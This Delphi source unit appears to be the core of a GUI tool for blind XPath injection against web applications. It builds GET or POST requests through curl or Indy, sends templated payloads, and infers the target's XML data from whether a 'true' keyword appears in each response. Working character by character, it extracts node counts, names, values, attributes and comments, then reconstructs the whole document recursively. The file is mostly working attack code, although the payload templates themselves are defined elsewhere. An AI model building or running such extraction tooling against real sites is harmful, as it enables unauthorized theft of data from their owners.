unit untCURL;

interface
uses Forms, Classes, SysUtils, untVariables, IdHTTP, IdIOHandlerStack, idSocketHandle, IdStackConsts;

var counter: integer;
    myLoader: TIdHTTP;

procedure createBatchFile;
procedure GenerateGETRequest(curl_config, url: string);
function GenerateGETRequest2(url, customHeader: string): string;
procedure GeneratePOSTRequest(curl_config, url, params: string);
function GeneratePOSTRequest2(urlIn, params, customHeader: string): string;
function testPayload(keyword: string): boolean;
function testPayload2(keyword, data: string): boolean;
function getNumberOfChildNodes(nodeName: string): integer;
function URLEncode(dataIn: string): string;
function getNodeNameLength(nodeName: string): integer;
function getNodeNameCharacter(nodeName: string; charPos: integer): string;
function getNodeName(nodeName: string): string;
function getNodeValueLength(nodeName: string): integer;
function getNodeValueCharacter(nodeName: string; charPos: integer): string;
function getNodeValue(nodeName: string): string;
procedure GetXMLForNode(currentNodeName: string; useCurl: boolean);
function TrimPayload(dataIn: string): string;

procedure LogIt(data: string);

implementation

uses untMain;




//----------------------------------------------------------------log everything
procedure LogIt(data: string);
begin
  frmMain.StatusBar.Panels[1].Text := data;
end;





//-----------------------------get appropriate nr of tabs based on source string
function getIndent(dataIn:string): string;
var i, count: integer;
begin
  count := 0;
  for  i:= 0 to length(dataIn) do
  begin
    if copy(dataIn, i, 1) = '/' then count := count + 1;
  end;
  if count > 1 then count := count - 1;
  result := StringOfChar(' ', count * 3);
end;





//-----------------------------------------------------------simple URL encoding
function URLEncode(dataIn: string): string;
const
  excludeDictionary = '01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ''"=|/*():.?';
var
  i: integer;
  c: char;

  function isInDictionary(dataIn: char): boolean;
  var i: integer;
  begin
    result := false;
    for i := 1 to length(excludeDictionary) do
    begin
      if excludeDictionary[i] = dataIn then
      begin
        result := true;
        break;
      end;
    end;
  end;
  
begin
  result := '';
  for i := 1 to length(dataIn) do
  begin
    c := dataIn[i];
    if isInDictionary(c) then result := result + c else
    result := result + '%' + inttohex(ord(c), 2);
  end;
end;





//---------------------------------------let's create the temp batch file (CURL)
procedure createBatchFile;
var ls: TStringList;
begin
  ls := TStringList.Create;
  ls.Add('del "' + resultFile + '"');
  ls.Add('"' + curlExe + '" --config "' + tempCurlConfig + '" -k >"' + resultFile + '"');
  ls.SaveToFile(batchFile);
  ls.Free;
end;





//------------------------------------------generate standard GET request (CURL)
procedure GenerateGETRequest(curl_config, url: string);
var ls: TStringList;
begin
  ls := TStringList.Create;
  ls.LoadFromFile(curl_config);
  ls.Add('');
  ls.Add('#-------------------------------------- target URL');
  ls.Add('url ' + url);
  ls.SaveToFile(tempCurlConfig);
  ls.Free;
end;





//---------------------------------generate standard GET request (NON-CURL only)
function GenerateGETRequest2(url, customHeader: string): string;
begin
  myLoader.Request.CustomHeaders.Clear;
  if (frmMain.chkUseCustomHTTPHeader.Checked = true) and (trim(customHeader) <> '') then myLoader.Request.CustomHeaders.Add(trim(customHeader));

  try
    result := myLoader.Get(url);
  except

    on E: Exception do
    begin
      result := '';
      global_stop := true;
      application.MessageBox(pchar(E.message), pchar('Error'), 0);
    end;

  end;
  sleep(50);
  application.ProcessMessages;
end;





//--------------------------------generate standard POST request (NON-CURL only)
function GeneratePOSTRequest2(urlIn, params, customHeader: string): string;
var
  aStream: TMemoryStream;
  LoaderParams: TStringStream;
begin
  aStream := TMemoryStream.create;
  LoaderParams := TStringStream.create('');
  LoaderParams.WriteString(URLEncode(params));

  with myLoader do
  begin
    Request.ContentType := 'application/x-www-form-urlencoded';
    myLoader.Request.CustomHeaders.Clear;
    if (frmMain.chkUseCustomHTTPHeader.Checked = true) and (trim(customHeader) <> '') then myLoader.Request.CustomHeaders.Add(trim(customHeader));

    try
      myLoader.Post(urlIn, LoaderParams, aStream);
    except

      on E: Exception do
      begin
        global_stop := true;      
        application.MessageBox(pchar(E.message), pchar('Error'), 0);
      end;
      
    end;
  end;

  aStream.WriteBuffer(#0' ', 1);
  result := PChar(aStream.Memory);

  aStream.Free;
  LoaderParams.Free;

  sleep(50);
  application.ProcessMessages;
end;





//-------------------------------------------------generate standard GET request
procedure GeneratePOSTRequest(curl_config, url, params: string);
var ls: TStringList;
begin
  ls := TStringList.Create;
  ls.LoadFromFile(curl_config);
  ls.Add('');
  ls.Add('#-------------------------------------- target URL');
  ls.Add('url ' + url);
  ls.Add('');
  ls.Add('#-------------------------------------- POST parameters');
  ls.Add('-d "' + params + '"');
  ls.SaveToFile(tempCurlConfig);
  ls.Free;
end;





//---------------------------------------------test the payload. if works = true
function testPayload(keyword: string): boolean;
var ls: TStringList;
begin
  result := false;
  if fileExists(tempCurlConfig) then
  begin
    frmMain.LMDS.Command := batchFile;
    frmMain.LMDS.Execute;

    ls := TStringList.Create;
    ls.LoadFromFile(resultFile);
    if pos(keyword, ls.Text) > 0 then result := true;
    ls.Free;
  end else LogIt('Can''t find CURL config file "' + tempCurlConfig + '".');
end;





//-----------------------------test the payload. if works = true (NON-CURL only)
function testPayload2(keyword, data: string): boolean;
begin
  result := false;
  if pos(keyword, data) > 0 then result := true;
end;





//--------------prepare the payload considering if it is string or integer-based
function TrimPayload(dataIn: string): string;
begin
  if frmMain.radStringBasedExploit.Checked = true then result := dataIn
  else if frmMain.radIntegerBasedExploit.Checked = true then result := copy(dataIn, 2, length(dataIn)) + '''';

end;




//------------------------------------------calculate number of root child nodes
function getNumberOfChildNodes(nodeName: string): integer;
var i: integer;
    payload: string;
    testResult: boolean;
    url: string;
begin
  rf := [rfReplaceAll];
  result := 0;

  for i := 1 to adv_max_child_nodes_to_search do //--- do not iterate too much...
  begin
    //--- generate the payload
    payload := StringReplace(TrimPayload(adv_payload_nr_of_child_nodes), '<iterator>', inttostr(i), rf);
    payload := StringReplace(payload, '<node_name>', nodeName, rf);

    //---------------------------------GET REQUEST
    if frmMain.radGetRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GenerateGETRequest(sourceHTTPHeader,
                           URLEncode(trim(frmMain.edtURL.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text) + payload);
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GenerateGETRequest2(url, frmMain.memCustomHTTPHeader.Text));
      end;
    end else

    //---------------------------------POST REQUEST
    if frmMain.radPostRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GeneratePOSTRequest(sourceHTTPHeader,
                            URLEncode(trim(frmMain.edtURL.Text)),
                            URLEncode(trim(frmMain.memPostParameters.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text));
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GeneratePOSTRequest2(url,
                                                                                     frmMain.memPostParameters.Text + payload,
                                                                                     frmMain.memCustomHTTPHeader.Text));
      end;
    end;

    //--- some info (let user know what is going on...)
    LogIt('Finding number of ' + nodeName + ' child nodes: ' + inttostr(i));
    LogIt(payload);

    //--- process messages
    application.ProcessMessages;

    if testResult then
    begin
      result := i;
      break;
    end;

    if global_stop = true then exit;
  end;
end;





//---------------get the length of the NAME of the given node (nr of characters)
function getNodeNameLength(nodeName: string): integer;
var i: integer;
    payload: string;
    testResult: boolean;
    url: string;
begin
  rf := [rfReplaceAll];
  result := 0;

  for i := 1 to adv_max_nodename_length do //--- do not iterate too much...
  begin
    //--- generate the payload
    payload := StringReplace(TrimPayload(adv_payload_get_nodename_length), '<iterator>', inttostr(i), rf);
    payload := StringReplace(payload, '<node_name>', nodeName, rf);

    //---------------------------------GET REQUEST
    if frmMain.radGetRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GenerateGETRequest(sourceHTTPHeader,
                           URLEncode(trim(frmMain.edtURL.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text) + payload);
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GenerateGETRequest2(url, frmMain.memCustomHTTPHeader.Text));
      end;
    end else

    //---------------------------------POST REQUEST
    if frmMain.radPostRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GeneratePOSTRequest(sourceHTTPHeader,
                            URLEncode(trim(frmMain.edtURL.Text)),
                            URLEncode(trim(frmMain.memPostParameters.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text));
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GeneratePOSTRequest2(url,
                                                                                     frmMain.memPostParameters.Text + payload,
                                                                                     frmMain.memCustomHTTPHeader.Text));
      end;
    end;

    //--- some info (let user know what is going on...)
    LogIt('Calculating node''s ' + nodeName + ' length (chars): ' + inttostr(i));
    LogIt(payload);

    //--- process messages
    application.ProcessMessages;

    if testResult then
    begin
      result := i;
      break;
    end;

    if global_stop = true then exit;
  end;
end;





//--------------get the length of the VALUE of the given node (nr of characters)
function getNodeValueLength(nodeName: string): integer;
var i: integer;
    payload: string;
    testResult: boolean;
    url: string;
begin
  rf := [rfReplaceAll];
  result := 0;

  for i := 1 to adv_max_nodename_length do //--- do not iterate too much...
  begin
    //--- generate the payload
    payload := StringReplace(TrimPayload(adv_payload_get_nodevalue_length), '<iterator>', inttostr(i), rf);
    payload := StringReplace(payload, '<node_name>', nodeName, rf);

    //---------------------------------GET REQUEST
    if frmMain.radGetRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GenerateGETRequest(sourceHTTPHeader,
                           URLEncode(trim(frmMain.edtURL.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text) + payload);
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GenerateGETRequest2(url, frmMain.memCustomHTTPHeader.Text));
      end;
    end else

    //---------------------------------POST REQUEST
    if frmMain.radPostRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GeneratePOSTRequest(sourceHTTPHeader,
                            URLEncode(trim(frmMain.edtURL.Text)),
                            URLEncode(trim(frmMain.memPostParameters.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text));
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GeneratePOSTRequest2(url,
                                                                                     frmMain.memPostParameters.Text + payload,
                                                                                     frmMain.memCustomHTTPHeader.Text));
      end;
    end;

    //--- some info (let user know what is going on...)
    LogIt('Calculating node''s ' + nodeName + ' value (chars): ' + inttostr(i));
    LogIt(payload);

    //--- process messages
    application.ProcessMessages;

    if testResult then
    begin
      result := i;
      break;
    end;

    if global_stop = true then exit;
  end;
end;





//---------------------------get a ONE CHARACTER from the NAME of the given node
function getNodeNameCharacter(nodeName: string; charPos: integer): string;
var i: integer;
    payload,
    charset, c: string;
    testResult: boolean;
    url: string;
begin
  charset := frmMain.memCharset.Text;
  rf := [rfReplaceAll];
  result := '';

  for i := 1 to length(charset) do //--- do not iterate too much...
  begin
    //--- generate the payload
    c := copy(charset, i, 1);
    payload := StringReplace(TrimPayload(adv_payload_get_nodename), '<character>', c, rf);
    payload := StringReplace(payload, '<character_position>', inttostr(charPos), rf);
    payload := StringReplace(payload, '<node_name>', nodeName, rf);

    //---------------------------------GET REQUEST
    if frmMain.radGetRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GenerateGETRequest(sourceHTTPHeader,
                           URLEncode(trim(frmMain.edtURL.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text) + payload);
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GenerateGETRequest2(url, frmMain.memCustomHTTPHeader.Text));
      end;
    end else

    //---------------------------------POST REQUEST
    if frmMain.radPostRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GeneratePOSTRequest(sourceHTTPHeader,
                            URLEncode(trim(frmMain.edtURL.Text)),
                            URLEncode(trim(frmMain.memPostParameters.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text));
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GeneratePOSTRequest2(url,
                                                                                     frmMain.memPostParameters.Text + payload,
                                                                                     frmMain.memCustomHTTPHeader.Text));
      end;
    end;

    //--- some info (let user know what is going on...)
    LogIt('Finding node''s ' + nodeName + ' [' + inttostr(charPos)  + '] character: ' + charset[i]);
    LogIt(payload);

    //--- process messages
    application.ProcessMessages;

    if testResult then
    begin
      result := c;
      break;
    end;

    if global_stop = true then exit;
  end;
end;





//--------------------------get a ONE CHARACTER from the VALUE of the given node
function getNodeValueCharacter(nodeName: string; charPos: integer): string;
var i: integer;
    payload,
    charset, c: string;
    testResult: boolean;
    url: string;
begin
  charset := frmMain.memCharset.Text;
  rf := [rfReplaceAll];
  result := '';

  for i := 1 to length(charset) do //--- do not iterate too much...
  begin
    //--- generate the payload
    c := copy(charset, i, 1);
    payload := StringReplace(TrimPayload(adv_payload_get_nodevalue), '<character>', c, rf);
    payload := StringReplace(payload, '<character_position>', inttostr(charPos), rf);
    payload := StringReplace(payload, '<node_name>', nodeName, rf);

    //---------------------------------GET REQUEST
    if frmMain.radGetRequest.Checked then
    begin
      if global_use_curl then //-- use CURL
      begin
        GenerateGETRequest(sourceHTTPHeader,
                           URLEncode(trim(frmMain.edtURL.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text) + payload);
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GenerateGETRequest2(url, frmMain.memCustomHTTPHeader.Text));
      end;
    end else

    //---------------------------------POST REQUEST        
    if frmMain.radPostRequest.Checked then
    begin
      if global_use_curl then
      begin
        GeneratePOSTRequest(sourceHTTPHeader,
                            URLEncode(trim(frmMain.edtURL.Text)),
                            URLEncode(trim(frmMain.memPostParameters.Text) + payload));
        testResult := testPayload(frmMain.edtKeywordTrue.text);
      end else
      begin
        URL := URLEncode(trim(frmMain.edtURL.Text));
        testResult := testPayload2(frmMain.edtKeywordTrue.text, GeneratePOSTRequest2(url,
                                                                                     frmMain.memPostParameters.Text + payload,
                                                                                     frmMain.memCustomHTTPHeader.Text));
      end;
    end;

    //--- some info (let user know what is going on...)
    LogIt('Finding node''s ' + nodeName + ' [' + inttostr(charPos)  + '] character: ' + charset[i]);
    LogIt(payload);

    //--- process messages
    application.ProcessMessages;

    if testResult then
    begin
      result := c;
      break;
    end;

    if global_stop = true then exit;
  end;
end;





//-------------------------------------------------get the NAME of selected node
function getNodeName(nodeName: string): string;
var nodeLength, i: integer;
begin
  result := '';
  nodeLength := getNodeNameLength(nodeName);
  if nodeLength > 0 then
  begin
    for i := 1 to nodeLength do
    begin
      result := result + getNodeNameCharacter(nodeName, i);
    end;
  end;
end;





//------------------------------------------------get the VALUE of selected node
function getNodeValue(nodeName: string): string;
var nodeLength, i: integer;
begin
  result := '';
  nodeLength := getNodeValueLength(nodeName);
  if nodeLength > 0 then
  begin
    for i := 1 to nodeLength do
    begin
      result := result + getNodeValueCharacter(nodeName, i);
    end;
  end;
end;






//------------------------------------------get entire XML structure (recursive)
procedure GetXMLForNode(currentNodeName: string; useCurl: boolean);
var childNodesCount, attributesCount, commentsCount, i: integer;
    childNameStr, nodeValue, attributes, comment: string;
begin

  global_use_curl := useCurl;
  rf := [rfReplaceAll];

  //--- calculate nr of child nodes
  childNodesCount := getNumberOfChildNodes(currentNodeName + '/*');

  //if (currentNodeName <> '/*') then currentNodeName := currentNodeName + '/*';
  //childNodesCount := getNumberOfChildNodes(currentNodeName);


  //----------------------------------------------------------EXTCACT ATTRIBUTES
  if (frmMain.chkOptExtractAttributes.Checked = true) then
  begin
    //---

    //--- calculate nr of attributes for this node
    attributesCount := getNumberOfChildNodes(currentNodeName + '/@*');

    //--- extract attributes
    if attributesCount > 0 then
    begin
      for i := 1 to attributesCount do
      begin
        attributes := attributes + ' ' + getNodeName(currentNodeName + '/@*[' + inttostr(i) + ']') + '="' + getNodeValue(currentNodeName + '/@*[' + inttostr(i) + ']') + '"';

        if global_stop = true then exit;
      end;

      stringReplace(frmMain.memResults.Lines[frmMain.memResults.Lines.count - 1], '>',  attributes + '>', rf);
    end;

    frmMain.memResults.Lines[frmMain.memResults.Lines.count - 1] := stringReplace(frmMain.memResults.Lines[frmMain.memResults.Lines.count - 1], '>',  attributes + '>', rf);

    //---
  end;



  //------------------------------------------------------------EXTRACT COMMENTS
  if (frmMain.chkOptExtractComments.Checked = true) then
  begin
    //---

    //--- calculate nr of comments for this node
    commentsCount := getNumberOfChildNodes(currentNodeName + '/comment()');

    //--- extract comments
    if commentsCount > 0 then
    begin
      for i := 1 to commentsCount do
      begin
        comment := getNodeValue(currentNodeName + '/comment()[' + inttostr(i) + ']');
        frmMain.memResults.Lines.Add(getIndent(currentNodeName) + '<!--' + comment + '-->');
        if global_stop = true then exit;
      end;
    end;

    //---
  end;




  //--- process child nodes (if they exist)
  if childNodesCount > 0 then
  begin
    for i := 1 to childNodesCount do
    begin
       childNameStr := getNodeName(currentNodeName + '/*[' + inttostr(i) + ']');

       //--- open node
       frmMain.memResults.Lines.Add(getIndent(currentNodeName) + '<' + childNameStr + '>');

       //--- rerursive: process child nodes
       GetXMLForNode(currentNodeName + '/*[' + inttostr(i) + ']', useCurl);

       //--- close node
       frmMain.memResults.Lines.Add(getIndent(currentNodeName) + '</' + childNameStr + '>');

       if global_stop = true then exit;       
    end;
  end else

  //--- get the node's value if exists
  begin

    //--------------------------------------------------------EXTRACT NODE VALUE
    if (frmmain.chkOptExtractNodeValues.Checked = true) then
    begin
      //---
      nodeValue := getNodeValue(currentNodeName);
      if nodeValue <> '' then
      begin
        frmMain.memResults.Lines.Add(getIndent(currentNodeName) + nodeValue);
      end;
      //---
    end;

  end;




end;






end.
